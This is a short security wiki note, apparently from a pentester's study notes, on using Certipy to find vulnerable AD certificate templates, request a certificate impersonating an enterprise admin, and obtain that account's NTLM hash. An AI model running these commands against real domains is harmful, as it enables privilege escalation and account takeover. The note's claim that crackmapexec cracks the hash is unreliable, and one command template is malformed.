---
tags:
  - security
---
A tool used to generate certificates from a [[Active Directory Certificate Template|AD Certificate Template]].
# Finding Certificates
```
certipy find -u user@dns_name -p 'password' -dc-ip 10.0.1.16
```
You can see the possible priv-esc attacks in the `[!] Vulnerabilities` heading
# Generation
```
certipy req -u <user> -p <password> -ca <CertificateAuthority> -target <CAHostname> -template <vulnTemplate> -upn <targetUsername> -dns <DNSServer
```
### Example
```
certipy req -u Administrator@FCDomain.lab.micheal.com -dc-ip 10.100.119.28 -ns 10.100.5.53 -template TestVulnerableCertificate -upn EnterpriseAdmin@CDomain.lab.micheal.com -ca FC-CA01 
```
# Authorization to get [[New Technology LAN Manager|NTLM]] hash
```
certipy auth -pfx mycert.pfx -dc-ip 10.0.2.6
```
Can be cracked with [[crackmapexec]]